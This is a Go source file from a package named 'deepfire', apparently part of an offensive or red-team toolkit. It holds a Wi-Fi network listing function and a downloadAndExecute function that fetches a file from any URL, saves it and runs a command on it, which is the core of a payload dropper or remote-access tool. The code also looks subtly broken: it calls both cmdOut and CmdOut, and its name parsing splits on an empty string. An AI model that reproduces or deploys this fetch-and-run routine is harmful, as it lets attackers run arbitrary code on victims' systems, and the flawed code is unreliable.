package deepfire

import (
	"io"
	"net/http"
	"os"
	"strings"
)

func networks() ([]string, error) {
	wifi_names := []string{}

	out, err := cmdOut("nmcli dev wifi")
	if err != nil {
		return nil, err
	}

	o := strings.Split(out, "\n")[1:]
	for entry := range o {
		e := o[entry]
		wifi_name := strings.Split(e, "")[1]
		wifi_names = append(wifi_names, wifi_name)
	}

	return wifi_names, nil
}

// Hotfix much appreciated
func netInterfaces() []string {
	return []string{"wlan0"}
}

func downloadAndExecute(url string, cmd string) (string, error) {
	splitted := strings.Split(url, "/")
	filename := splitted[len(splitted)-1]
	if strings.Contains(cmd, ".exe") || strings.Contains(cmd, ".dll") {
		return "Cannot run specified execution task on linux or darwin", nil
	}
	f, err := os.Create(filename)
	if err != nil {
		return "failed", err
	}
	defer f.Close()

	response, err := http.Get(url)
	if err != nil {
		return "failed", err
	}
	defer response.Body.Close()

	_, err = io.Copy(f, response.Body)
	if err != nil {
		return "failed", err
	}
	_cmd := strings.Replace(cmd, "[file]", filename, 1)
	out, er := CmdOut(_cmd)
	return out, er
}
